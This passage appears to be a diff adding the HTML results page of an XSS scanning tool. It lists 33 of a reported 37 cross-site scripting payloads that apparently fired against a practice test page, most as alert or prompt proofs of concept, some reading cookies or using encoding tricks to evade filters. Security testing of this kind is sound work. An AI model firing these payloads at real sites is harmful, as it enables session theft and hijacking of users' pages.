@@ -1,0 +1,457 @@
+
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <style>
+            body {
+                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                margin: 0;
+                padding: 20px;
+                background-color: #000;
+                color: #00ff00;
+            }
+            h1, h2 {
+                color: #00ff00;
+                text-align: center;
+            }
+            .header {
+                display: flex;
+                justify-content: space-between;
+                padding: 10px 20px;
+                border-bottom: 2px solid #00ff00;
+                margin-bottom: 20px;
+                background-color: #333;
+            }
+            .header .left a {
+                color: #00ff00;
+                font-size: 18px;
+                text-decoration: none;
+            }
+            .header .right {
+                color: #00ff00;
+                font-size: 18px;
+            }
+            table {
+                width: 100%;
+                border-collapse: collapse;
+                margin-top: 20px;
+                background-color: #000;
+            }
+            th, td {
+                border: 1px solid #00ff00;
+                padding: 10px;
+                text-align: left;
+            }
+            th {
+                background-color: #004400;
+                color: #00ff00;
+            }
+            tr:nth-child(even) {
+                background-color: #1a1a1a;
+            }
+            tr:hover {
+                background-color: #333;
+                transition: background-color 0.3s ease;
+            }
+            a {
+                color: #1e90ff;
+                text-decoration: none;
+            }
+            a:hover {
+                text-decoration: underline;
+            }
+            .payload {
+                color: #e67e22;
+                font-weight: bold;
+            }
+            img.zoomable {
+                height: 100px;
+                cursor: pointer;
+                transition: transform 0.3s ease-in-out;
+            }
+            img.zoomable:hover {
+                transform: scale(1.2);
+            }
+            .modal {
+                display: none;
+                position: fixed;
+                z-index: 1000;
+                padding-top: 60px;
+                left: 0;
+                top: 0;
+                width: 100%;
+                height: 100%;
+                overflow: auto;
+                background-color: rgba(0, 0, 0, 0.9);
+            }
+            .modal-content {
+                margin: auto;
+                display: block;
+                width: 80%;
+                max-width: 700px;
+            }
+            .close {
+                position: absolute;
+                top: 15px;
+                right: 35px;
+                color: #fff;
+                font-size: 40px;
+                font-weight: bold;
+            }
+            .close:hover, .close:focus {
+                color: #bbb;
+                cursor: pointer;
+            }
+        </style>
+                    <script src='https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.4.0/jspdf.umd.min.js'></script>
+                    <script>
+            document.addEventListener('DOMContentLoaded', function() {
+                const rows = document.querySelectorAll('.report-row');
+                rows.forEach(row => {
+                    row.addEventListener('click', () => {
+                        row.classList.toggle('highlight');
+                    });
+                });
+
+                const modal = document.getElementById('modal');
+                const modalImg = document.getElementById('modal-image');
+                const images = document.querySelectorAll('.zoomable');
+                const span = document.getElementsByClassName('close')[0];
+
+                let timer;
+
+                images.forEach(image => {
+                    image.addEventListener('mouseover', function() {
+                        clearTimeout(timer);
+                        modal.style.display = 'block';
+                        modalImg.src = this.src;
+                    });
+
+                    image.addEventListener('mouseout', function() {
+                        timer = setTimeout(() => {
+                            modal.style.display = 'none';
+                        }, 2000);
+                    });
+                });
+
+                span.onclick = function() { 
+                    modal.style.display = 'none';
+                    clearTimeout(timer);
+                };
+
+                window.onclick = function(event) {
+                    if (event.target == modal) {
+                        modal.style.display = 'none';
+                        clearTimeout(timer);
+                    }
+                };
+
+                document.getElementById('download-pdf').addEventListener('click', downloadPDF);
+            });
+
+            function downloadPDF() {
+                const { jsPDF } = window.jspdf;
+                const doc = new jsPDF();
+                const elementHTML = document.getElementById('report-table').outerHTML;
+                const filename = document.getElementById('download-pdf').getAttribute('data-filename');
+                doc.html(elementHTML, {
+                    callback: function (doc) {
+                        doc.save(filename);
+                    },
+                    x: 10,
+                    y: 10,
+                });
+            }
+        </script>
+                </head>
+            
+                <body>
+                    <div class='header'>
+                        <div class='left'>
+                            <a href='https://www.linkedin.com/in/ibrahim-husi%C4%87-101430102/' target='_blank'>LinkedIn Profile of Ibrahim</a>
+                        </div>
+                        <div class='right'>
+                            <span>#IbrahimXSS Tool V3</span>
+                        </div>
+                    </div>
+                    <h1 class='report-title'>Report 06/19/2024 09:54</h1>
+                    <h2>Found: 37 items</h2>
+                    <button id='download-pdf' data-filename='report-2024_6_19_9_53_49_361.pdf'>Download as PDF</button>
+                    <table id='report-table'>
+                        <thead>
+                            <tr>
+                                <th>Index</th>
+                                <th>Image</th>
+                                <th>Payload</th>
+                                <th>Request</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                <tr class='report-row'>
+                    <td>1</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_49_245.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;/>&lt;iMg SrC=&quot;x&quot; oNeRRor=&quot;alert(document.cookie);&quot;></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&quot;/>&lt;iMg SrC=&quot;x&quot; oNeRRor=&quot;alert(document.cookie);&quot;>'>https://brutelogic.com.br/xss.php/&quot;/&gt;&lt;iMg SrC=&quot;x&quot; oNeRRor=&quot;alert(document.cookie);&quot;&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>2</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_49_738.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;script>alert(1)&lt;/script>&lt;&quot;</td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&quot;>&lt;script>alert(1)&lt;/script>&lt;&quot;'>https://brutelogic.com.br/xss.php/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>3</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_50_216.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;&#39;>&lt;img src=q onerror=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&quot;&#39;>&lt;img src=q onerror=alert(1)>'>https://brutelogic.com.br/xss.php/&quot;&#39;&gt;&lt;img src=q onerror=alert(1)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>4</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_50_798.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;/textarea>&lt;ScRiPt>prompt(1)&lt;/ScRiPt// &quot;>&lt;iframe/onload=alert(1)// ”/>&amp;_lt;_script>alert(1)&amp;_lt;/scr_ipt&amp;gt”/></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&quot;>&lt;/textarea>&lt;ScRiPt>prompt(1)&lt;/ScRiPt// &quot;>&lt;iframe/onload=alert(1)// ”/>&amp;_lt;_script>alert(1)&amp;_lt;/scr_ipt&amp;gt”/>'>https://brutelogic.com.br/xss.php/&quot;&gt;&lt;/textarea&gt;&lt;ScRiPt&gt;prompt(1)&lt;/ScRiPt// &quot;&gt;&lt;iframe/onload=alert(1)// ”/&gt;&amp;_lt;_script&gt;alert(1)&amp;_lt;/scr_ipt&amp;gt”/&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>5</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_50_829.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&#39;&quot;>>&lt;marquee>&lt;img src=x onerror=confirm(1)>&lt;/marquee>&quot;>&lt;/plaintext\>&lt;/|\>&lt;plaintext/onmouseover=prompt(1)>&lt;script>prompt(1)&lt;/script>@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit>&#39;-->&quot;>&lt;/script>&lt;script>alert(1)&lt;/script>&quot;>&lt;img/id=&quot;confirm&amp;lpar;1)&quot;/alt=&quot;/&quot;src=&quot;/&quot;onerror=eval(id&amp;%23x29;>&#39;&quot;>&lt;img src=&quot;http://i.imgur.com/P8mL8.jpg&quot;></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&#39;&quot;>>&lt;marquee>&lt;img src=x onerror=confirm(1)>&lt;/marquee>&quot;>&lt;/plaintext\>&lt;/|\>&lt;plaintext/onmouseover=prompt(1)>&lt;script>prompt(1)&lt;/script>@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit>&#39;-->&quot;>&lt;/script>&lt;script>alert(1)&lt;/script>&quot;>&lt;img/id=&quot;confirm&amp;lpar;1)&quot;/alt=&quot;/&quot;src=&quot;/&quot;onerror=eval(id&amp;%23x29;>&#39;&quot;>&lt;img src=&quot;http://i.imgur.com/P8mL8.jpg&quot;>'>https://brutelogic.com.br/xss.php/&#39;&quot;&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;&quot;&gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1)&gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;&#39;--&gt;&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;img/id=&quot;confirm&amp;lpar;1)&quot;/alt=&quot;/&quot;src=&quot;/&quot;onerror=eval(id&amp;%23x29;&gt;&#39;&quot;&gt;&lt;img src=&quot;http://i.imgur.com/P8mL8.jpg&quot;&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>6</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_51_265.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%20&quot;>&lt;svg onload=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/%20&quot;>&lt;svg onload=alert(1)>'>https://brutelogic.com.br/xss.php/%20&quot;&gt;&lt;svg onload=alert(1)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>7</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_51_295.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img%20src=x%20onerror=&quot;alert(%27POC%20By%20DrakenKun%27)&quot;</td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&quot;>&lt;img%20src=x%20onerror=&quot;alert(%27POC%20By%20DrakenKun%27)&quot;'>https://brutelogic.com.br/xss.php/&quot;&gt;&lt;img%20src=x%20onerror=&quot;alert(%27POC%20By%20DrakenKun%27)&quot;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>8</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_52_209.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&#39;;alert(String.fromCharCode(88,83,83))//&#39;;alert(String. fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode (88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//-- >&lt;/SCRIPT>&quot;>&#39;>&lt;SCRIPT>alert(String.fromCharCode(88,83,83)) &lt;/SCRIPT></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&#39;;alert(String.fromCharCode(88,83,83))//&#39;;alert(String. fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode (88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//-- >&lt;/SCRIPT>&quot;>&#39;>&lt;SCRIPT>alert(String.fromCharCode(88,83,83)) &lt;/SCRIPT>'>https://brutelogic.com.br/xss.php/&#39;;alert(String.fromCharCode(88,83,83))//&#39;;alert(String. fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode (88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//-- &gt;&lt;/SCRIPT&gt;&quot;&gt;&#39;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83)) &lt;/SCRIPT&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>9</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_52_546.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>1&#39;)&quot;&lt;!-->&lt;Svg OnLoad=(confirm)(1)&lt;!--</td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/1&#39;)&quot;&lt;!-->&lt;Svg OnLoad=(confirm)(1)&lt;!--'>https://brutelogic.com.br/xss.php/1&#39;)&quot;&lt;!--&gt;&lt;Svg OnLoad=(confirm)(1)&lt;!--</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>10</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_52_886.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&#39;&quot;/>&lt;img src= x onerror=&#39;alert(document.domain)&#39;></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&#39;&quot;/>&lt;img src= x onerror=&#39;alert(document.domain)&#39;>'>https://brutelogic.com.br/xss.php/&#39;&quot;/&gt;&lt;img src= x onerror=&#39;alert(document.domain)&#39;&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>11</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_52_909.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;svg/onload=confirm(1)>&quot;@x.y</td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&quot;>&lt;svg/onload=confirm(1)>&quot;@x.y'>https://brutelogic.com.br/xss.php/&quot;&gt;&lt;svg/onload=confirm(1)&gt;&quot;@x.y</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>12</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_52_936.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%22%3E%3Cobject%20data=data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==%3E%3C/object%3E</td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/%22%3E%3Cobject%20data=data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==%3E%3C/object%3E'>https://brutelogic.com.br/xss.php/%22%3E%3Cobject%20data=data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==%3E%3C/object%3E</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>13</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_53_25.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%22%3E%3Cimg%09src%3Dx%09onerror%3Dprompt(document.domain);%3E</td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/%22%3E%3Cimg%09src%3Dx%09onerror%3Dprompt(document.domain);%3E'>https://brutelogic.com.br/xss.php/%22%3E%3Cimg%09src%3Dx%09onerror%3Dprompt(document.domain);%3E</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>14</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_53_294.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;}]}&#39;;&lt;/script>&lt;script>alert(&#39;You got XSSed&#39;)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&quot;}]}&#39;;&lt;/script>&lt;script>alert(&#39;You got XSSed&#39;)&lt;/script>'>https://brutelogic.com.br/xss.php/&quot;}]}&#39;;&lt;/script&gt;&lt;script&gt;alert(&#39;You got XSSed&#39;)&lt;/script&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>15</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_53_777.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%3F%20&quot;>&lt;img src=x onerror=prompt(document.domain);></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/%3F%20&quot;>&lt;img src=x onerror=prompt(document.domain);>'>https://brutelogic.com.br/xss.php/%3F%20&quot;&gt;&lt;img src=x onerror=prompt(document.domain);&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>16</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_53_983.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;svg onload=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&quot;>&lt;svg onload=alert(1)>'>https://brutelogic.com.br/xss.php/&quot;&gt;&lt;svg onload=alert(1)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>17</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_54_590.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=/x onerror=prompt(document.domain);></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&quot;>&lt;img src=/x onerror=prompt(document.domain);>'>https://brutelogic.com.br/xss.php/&quot;&gt;&lt;img src=/x onerror=prompt(document.domain);&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>18</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_55_181.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>x&quot;>&lt;svg%0Donload=&quot;window[&#39;alert&#39;]((document)[&#39;cookie&#39;])&quot;></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/x&quot;>&lt;svg%0Donload=&quot;window[&#39;alert&#39;]((document)[&#39;cookie&#39;])&quot;>'>https://brutelogic.com.br/xss.php/x&quot;&gt;&lt;svg%0Donload=&quot;window[&#39;alert&#39;]((document)[&#39;cookie&#39;])&quot;&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>19</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_55_364.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E</td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E'>https://brutelogic.com.br/xss.php/%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>20</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_55_645.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;svg%20onload=alert%26%230000000040&quot;mysanismine&quot;)></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&quot;>&lt;svg%20onload=alert%26%230000000040&quot;mysanismine&quot;)>'>https://brutelogic.com.br/xss.php/&quot;&gt;&lt;svg%20onload=alert%26%230000000040&quot;mysanismine&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>21</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_56_577.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=x\%28\%29\ onerror=prompt(document.domain);></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&quot;>&lt;img src=x\%28\%29\ onerror=prompt(document.domain);>'>https://brutelogic.com.br/xss.php/&quot;&gt;&lt;img src=x\%28\%29\ onerror=prompt(document.domain);&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>22</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_56_716.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=x onerror=confirm(&#39;x&#39;) />]</td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&quot;>&lt;img src=x onerror=confirm(&#39;x&#39;) />]'>https://brutelogic.com.br/xss.php/&quot;&gt;&lt;img src=x onerror=confirm(&#39;x&#39;) /&gt;]</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>23</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_57_577.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%22%27%3E&#39;>&lt;script>alert(2);&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/%22%27%3E&#39;>&lt;script>alert(2);&lt;/script>'>https://brutelogic.com.br/xss.php/%22%27%3E&#39;&gt;&lt;script&gt;alert(2);&lt;/script&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>24</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_57_879.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img/src/onerror=alert(`ibro`)></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&quot;>&lt;img/src/onerror=alert(`ibro`)>'>https://brutelogic.com.br/xss.php/&quot;&gt;&lt;img/src/onerror=alert(`ibro`)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>25</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_58_59.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg>&lt;/p>&lt;style>&lt;g title=&quot;&lt;/style>&lt;img src onerror=alert(document.domain)>&quot;></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&lt;svg>&lt;/p>&lt;style>&lt;g title=&quot;&lt;/style>&lt;img src onerror=alert(document.domain)>&quot;>'>https://brutelogic.com.br/xss.php/&lt;svg&gt;&lt;/p&gt;&lt;style&gt;&lt;g title=&quot;&lt;/style&gt;&lt;img src onerror=alert(document.domain)&gt;&quot;&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>26</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_58_374.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;iframe/src=&quot;javascript:alert(1%26%23x00000000000000000000000000029;&quot;>&lt;/iframe></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&quot;>&lt;iframe/src=&quot;javascript:alert(1%26%23x00000000000000000000000000029;&quot;>&lt;/iframe>'>https://brutelogic.com.br/xss.php/&quot;&gt;&lt;iframe/src=&quot;javascript:alert(1%26%23x00000000000000000000000000029;&quot;&gt;&lt;/iframe&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>27</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_58_635.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=x onerror=prompt(document[&#39;domain&#39;]);>.html</td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&quot;>&lt;img src=x onerror=prompt(document[&#39;domain&#39;]);>.html'>https://brutelogic.com.br/xss.php/&quot;&gt;&lt;img src=x onerror=prompt(document[&#39;domain&#39;]);&gt;.html</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>28</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_58_980.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E</td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E'>https://brutelogic.com.br/xss.php/test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>29</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_53_59_502.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=x onerror=prompt(document[&#39;domain&#39;]);>.aspx</td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&quot;>&lt;img src=x onerror=prompt(document[&#39;domain&#39;]);>.aspx'>https://brutelogic.com.br/xss.php/&quot;&gt;&lt;img src=x onerror=prompt(document[&#39;domain&#39;]);&gt;.aspx</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>30</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_54_0_305.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>1&#39;&quot;>&lt;img/src/onerror=.1|alert``></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/1&#39;&quot;>&lt;img/src/onerror=.1|alert``>'>https://brutelogic.com.br/xss.php/1&#39;&quot;&gt;&lt;img/src/onerror=.1|alert``&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>31</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_54_0_850.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&#39;;alert(String.fromCharCode(88,83,83))//&#39;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//-->&lt;/SCRIPT>&quot;>&#39;>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&#39;;alert(String.fromCharCode(88,83,83))//&#39;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//-->&lt;/SCRIPT>&quot;>&#39;>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT>'>https://brutelogic.com.br/xss.php/&#39;;alert(String.fromCharCode(88,83,83))//&#39;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&#39;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>32</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_54_1_363.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&#39;>&lt;details/open/ontoggle=confirm(&#39;XSS&#39;)></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&quot;>&#39;>&lt;details/open/ontoggle=confirm(&#39;XSS&#39;)>'>https://brutelogic.com.br/xss.php/&quot;&gt;&#39;&gt;&lt;details/open/ontoggle=confirm(&#39;XSS&#39;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>33</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_54_1_455.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;iframe>&lt;img title=&quot;&lt;/iframe>&lt;img src onerror=alert(1)>&quot;>&lt;/iframe></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&lt;iframe>&lt;img title=&quot;&lt;/iframe>&lt;img src onerror=alert(1)>&quot;>&lt;/iframe>'>https://brutelogic.com.br/xss.php/&lt;iframe&gt;&lt;img title=&quot;&lt;/iframe&gt;&lt;img src onerror=alert(1)&gt;&quot;&gt;&lt;/iframe&gt;</a></td>
+                </tr>
